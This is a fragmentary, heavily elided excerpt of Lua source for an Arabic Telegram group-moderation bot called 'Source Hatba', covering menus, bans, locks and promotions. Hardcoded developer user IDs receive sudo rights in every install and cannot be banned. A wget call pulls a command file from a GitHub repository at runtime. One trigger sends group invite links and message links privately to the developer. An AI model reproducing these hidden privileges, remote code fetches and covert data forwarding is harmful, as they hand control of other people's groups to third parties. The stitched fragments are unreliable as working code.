...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "◃────𝘚𝘖𝘜𝘙𝘊𝘌 𝘏𝘈𝘛𝘉𝘈────▹ ◃────𝘚𝘖𝘜𝘙𝘊𝘌 𝘏𝘈𝘛𝘉𝘈────▹"
...
io.popen("cd File_Bot && wget https://github.com/Gambol00/G0/main/File_Bot/commands.lua") 
...
dev_users = {1804119251,1825532106}   
...
sudo_users = {SUDO,1804119251,1825532106}   
...
var = true 
elseif tonumber(user_id) == tonumber(1825532106) then
var = true  
...
if tonumber(user_id) == tonumber(1804119251) then  
var = '❦︎الــمـبــرمــج ســـيـــزر'
elseif tonumber(user_id) == tonumber(1825532106) then
var = 'DEVELOPER-'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
...
local UserName = (data.username_ or "su_hatba")
...
--------------------------------------------------------------------------------------------------------------
function su_hatba(msg,data) -- بداية العمل
if msg then
...
if textchuser then
send(msg.chat_id_, msg.id_,'['..su_hatba..']')
else
...
keyboard.inline_keyboard = {
{
{text = '𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽𝚂📚', callback_data="/change-hhh"},{text = '𝚂𝙾𝚄𝚁𝙲𝙴🌀', callback_data="/change-siusr"},
},
{
{text = '𝚉𝙾𝙳𝙸𝙰𝙲 📖', callback_data="/zDRGd"},{text = '𝙶𝙰𝙼𝙴𝚂 🎮', callback_data="/add"},
},
{
...
send(msg.chat_id_, msg.id_,' ☆ اصدار سورس حطبه{ S:1✓}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '⌯مطورين السورس⌯', url="t.me/su_hatba"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
bot_data:del(ban_id..'Srt:Bot') 
local Text = [[ 
[sᴏᴜʀᴄᴇ](t.me/su_hatba)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
send(msg.chat_id_, msg.id_,'هذا الامر خاص ب حطبه فقط')
return false
end
local msg_id = msg.id_/2097152/0.5 
...
bot_data:del(ban_id..'Srt:Bot') 
local Text = [[ 
 ☆ من أحسن السورسات على التليجرام سورس حطبه ☆
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/su_hatba&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
Namebot = "◉احـصائـيـاات"..Namebot..'•\n◉الجــروبـات• {'..Groups..'}\n◉المــشتـــرڪين • {'..Users..'}'
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙰𝚃𝙱𝙰', url = "https://t.me/su_hatba"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
...
usertext = '\n ☆ الـعـضو   ⋙ ['..result.title_..'](t.me/'..(username or 'su_hatba')..')'
status  = '\n ☆ تم ترقيته مطور'
...
usertext = '\n ☆ الـعـضو   ⋙ ['..data.first_name_..'](t.me/'..(data.username_ or 'su_hatba')..')'
status  = '\n ☆ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ الـعـضو   ⋙ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'su_hatba')..') \n ☆ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if text and text:match("^سيزر$") or text and text:match("^اصيل$") or text and text:match("^gambol$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1804119251,"✯. هناك شخص يريدك يا سيدي سيزر \n✯الشخص  {"..Name.."}\n✯اسم الجروب {"..NameChat.."}\n✯ايدي الجروب { `"..msg.chat_id_.."` }\n✯رابط الجروب \n [ "..LinkGroup.." ]\n    ✯رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end
...
print("it is Bot")
N = (bot_data:get(ban_id.."Name:Bot") or "حطبه")
...
send(msg.chat_id_,0, " ☆ عذرا  ⋙ {["..data.first_name_.."](T.ME/su_hatba)}\n ☆ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local msg_id = msg.id_/2097152/0.5  
local textt = "V_I_K_I_N_G_1"..(database:get(bot_id..'Name:Bot') or 'صعيدي')
...
local Text = [[
╔•◃────◈────▹•┓ 
[❑ 𝘚𝘖𝘜𝘙𝘊𝘌 𝘏𝘈𝘛𝘉𝘈](http://t.me/su_hatba)

[❑ 𝘔𝘠 𝘋𝘌𝘝 ‌](http://t.me/su_hatba)

[❑ 𝗔𝗕𝗗𝗢 𝗔𝗦𝗜𝗟 - ســـــــــيزر](http://t.me/s_e_z_r0)

[❑𝘉𝘖𝘛 𝘚𝘌𝘡𝘙](http://t.me/NINKJBOT)
┗•◃────◈────▹•┛
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙼𝚈 𝙳𝙴𝚅 ◉', callback_data="/units"},{text = '𝙼𝚈 𝙲𝙷𝙰𝙽𝙰𝙰𝙻 🌐', callback_data="/theytry"}},  
{{text = '𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽𝚂📚', callback_data="/change-hhh"},{text = '𝚂𝙾𝚄𝚁𝙲𝙴🌀', callback_data="/change-siusr"}},   
{{text = '𝚉𝙾𝙳𝙸𝙰𝙲 📖', callback_data="/zDRGd"},{text = '𝙶𝙰𝙼𝙴𝚂 🎮', callback_data="/add"}},    
{{text = '𓆩الـــمـطـــور𓆪', url="http://t.me/"..sudos.UserName}},
{{text = ' 𖤍 اضف البوت الي مجموعتك 𖤍 ', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sezr_su/9&caption='  .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
{{text = '𝘴ꪮꪊ𝘳ᥴꫀ ꪜ𝓲𝘬𝓲ꪀᧁ', url="t.me/V_I_K_I_N_G_1"}},
}
local msg_id = msg.id_/2097152/0.5
send_inline_key(msg.chat_id_,"*┆🌎 مرحبـا بـــك فــي قائمــه التحكــم اضغــط علــي الامــر في الاسفل لتتمكن من التحكم به ⇓⇑*",nil,keyboard,msg_id)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == 'سيزر' or text == 'اصيل' or text == 'مبرمج السورس' then
local Text = [[
𝙿𝚁𝙾𝙶𝚁𝙰𝙼𝙼𝙴𝚁 𝚂𝙴𝚉𝚁
𝙵𝙾𝙻𝙻𝙾𝚆 𝚃𝙷𝙴 𝙱𝚄𝚃𝚃𝙾𝙽𝚂 𝙻𝙾𝚆𝙴𝚁 ཻ ☫
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local Text = [[ 
[قناة سورس حطبه .. ادخل وتابع الجديد يقلبي](t.me/su_hatba)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙰𝚃𝙱𝙰', url="t.me/su_hatba"}}, 
...
if text == '◃────𝘚𝘖𝘜𝘙𝘊𝘌 𝘏𝘈𝘛𝘉𝘈────▹' then
local Text = [[ 
 ✯من أحسن السورسات على التليجرام سورس حــطــبــه✯
⌯بجد سورس أمان جدا وفي مميزات جامده⌯
⌯تع نصب بوتك عندنا يلا واستمتع بالمميزات⌯
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝘚𝘖𝘜𝘙𝘊𝘌 𝘏𝘈𝘛𝘉𝘈', url="t.me/su_hatba"}},{{text = '˹ᴛᴀᴡᴏsʟ˼', url="t.me/NINKJBOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sezr_su/22&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if tonumber(result.sender_user_id_) == tonumber(1825532106) then  
send(msg.chat_id_, msg.id_, " ☆ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1825532106) then
send(msg.chat_id_, msg.id_, " ☆ لا يمكنك حظر مبرمج السورس \n")
return false 
end
usertext = '\n ☆ الـعـضو   ⋙ ['..result.title_..'](t.me/'..(username or 'su_hatba')..')'
...
if tonumber(userid) == tonumber(1825532106) then  
send(msg.chat_id_, msg.id_, " ☆ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'su_hatba')..')'
...
send(msg.chat_id_, msg.id_, '☆  مـن قبـل  ⋙ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'su_hatba')..') \n☆ تم تفعيل التنظيف التلقائي ')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ تم تعطيل جلب الصوره ،\n ☆ تم قفل البوتات  ،\n ☆ تم قفل التكرار ،\n ☆ تم قفل الروابط ،\n ☆ تم قفل التوجيه ،\n ☆ تم قفل الملصقات ،\n ☆ تم قفل المتحركه ،\n ☆ تم قفل الفيديو ،\n ☆ تم قفل الفشار ،\n ☆ تم قفل الانلاين ،\n ☆ تم قفل تعديل المديا ،\n ☆ تم وضع التكرار  ،\n ☆ تم قفل الفارسيه  ،\n ☆ تم وضع الايدي بدون صوره ،n  \n ☆ تم تفعيل الحمايه  بواسطه ، ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'su_hatba')..')  ')
end,nil)   
end
...
bot_data:del(ban_id..'ghiktr'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  تم تعطيل الحمايه القصوي من قبل    ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'su_hatba')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆  مـن قبـل  ⋙ ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'su_hatba')..') \n ☆ تـم قفـل التاك بالكتم ')
end,nil)   
...
if Get_info then
local TextS = "\n ☆ اهلا بك في متجر ملفات حطبه\n ☆ ملفات السورس ↓\n◃────𝘚𝘖𝘜𝘙𝘊𝘌 𝘏𝘈𝘛𝘉𝘈────▹\n\n"
local TextE = "\n◃────𝘚𝘖𝘜𝘙𝘊𝘌 𝘏𝘈𝘛𝘉𝘈────▹\n ☆ علامة تعني { ✔️ } ملف مفعل\n ☆ علامة تعني { ✖ } ملف معطل\n ☆ قناة سورس حطبه↓\n".." ☆ [اضغط هنا لدخول](t.me/su_hatba) \n"
local NumFile = 0
...
if text == ("رفع سيزر") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
...
if text and text:match("^رفع سيزر @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع سيزر @(.*)$")
function Function_DRAGON(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"☆ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
if text and text:match("^رفع سيزر (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع سيزر (%d+)$")
bot_data:del(ban_id.."msa3d:ban")
...
if text == ("تنزيل سيزر") and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
local id = bot_data:get(ban_id.."id:msa3d:ban")
Reply_Status(msg,id,"reply","☆ تم تنزيله من سيزر")  
bot_data:del(ban_id.."msa3d:ban")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ☆ لعضو  ⋙ ['..data.first_name_..'](t.me/'..(data.username_ or 'su_hatba')..')'
status  = '\n ☆ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ☆ الـعـضو   ⋙ '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ☆ العضــو  ⋙ ['..data.first_name_..'](t.me/'..(data.username_ or 'su_hatba')..')'
...
usertext = '\n ☆  المستخدم  ⋙ ['..result.title_..'](t.me/'..(username or 'su_hatba')..')'
status  = '\n ☆ تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ☆ الـعـضو   ⋙ ['..result.title_..'](t.me/'..(text1[3] or 'su_hatba')..')'..'\n ☆ تم رفعه '..text1[2]..'')   
bot_data:sadd(ban_id..'Special:User'..msg.chat_id_,result.id_)  
...
keyboard.inline_keyboard = {
{
{text = texxtt, url="t.me/"..dofile("./Info.lua").botUserName},
},
{
...
if text == 'بوتي' then 
send(msg.chat_id_,msg.id_, '[ 💕 ااي يقلبي اؤمرني ](t.me/su_hatba)') 
return false
end
...
--------------
if text == ""..(bot_data:get(ban_id..'Name:Bot') or 'حطبه').." غادر" or text == 'غادر' and Sudo(msg) then     
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙰𝚃𝙱𝙰', url="t.me/SOURCEDRAGON"}},
}
...
local Teext =[[
•𝘞𝘌𝘓𝘊𝘖𝘔𝘌 𝘛𝘖  𝘚𝘖𝘜𝘙𝘊𝘌 𝘏𝘈𝘛𝘉𝘈
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝗔𝗕𝗗𝗢 𝗔𝗦𝗜𝗟 - ســـــــــيزر',url="t.me/s_e_z_r0"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙰𝚃𝙱𝙰',url="t.me/su_hatba"},{text = '˹ᴛᴀᴡᴏsʟ˼', url="t.me/NINKJBOT"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯ ˹𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙰𝚃𝙱𝙰˼',url="t.me/su_hatba"}},{{text = 'ᴍʏ ᴜsᴇʀ ❦︎',url="t.me/s_e_z_r0"}},
...
if Text == '/banfai' then
local Teext =[[
ʙᴀʀ ғᴏʀ 𝗔𝗕𝗗𝗢 𝗔𝗦𝗜𝗟 - ســـــــــيزر
𝙵𝙾𝙻𝙻𝙾𝚆 𝚃𝙷𝙴 𝙱𝚄𝚃𝚃𝙾𝙽𝚂 𝙻𝙾𝚆𝙴𝚁 ཻ ☫

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '◉ ᯓ ˹بار سيزر ࿐',url="t.me/farfasha6"}},
{{text = '☆𝙱𝙰𝙲𝙺↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/gqjik' then
local Teext =[[
ʙᴏᴛs ғᴏʀ 𝗔𝗕𝗗𝗢 𝗔𝗦𝗜𝗟 - ســـــــــيزر
𝙵𝙾𝙻𝙻𝙾𝚆 𝚃𝙷𝙴 𝙱𝚄𝚃𝚃𝙾𝙽𝚂 𝙻𝙾𝚆𝙴𝚁 ཻ ☫

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝗔𝗕𝗗𝗢 𝗔𝗦𝗜𝗟 - ســـــــــيزر',url="t.me/NINKJBOT"}},{{text = 'مصنع البـوتات↝ᵇᵒᵗ ♪',url="t.me/NINKJBOT"}},
{{text = '☆𝙱𝙰𝙲𝙺↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '•ᴍʏ ᴅᴇᴠ ⸙', callback_data="/units"},{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙰𝚃𝙱𝙰', callback_data="/theytry"}},   
{{text = '𓆩الـــمـطـــور𓆪', url="http://t.me/"..sudos.UserName}},
{{text = '𖤍 اضافه البوت لمجموعتك 𖤍' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"}}, 
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
...
الاعمال الملائمة : أطباء، صيادلة، مدرحطبه، أخصائيو تغذية، شيف، سماسرة
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙷𝙰𝚃𝙱𝙰',url='http://t.me/su_hatba'}},
}
...
local Name_Bot = (bot_data:get(ban_id..'Name:Bot') or 'حطبه')
...
"صراحه  |  ااي رايك ف سيزر؟",
"صراحه  |  هل انت بتحب سيزر ؟",
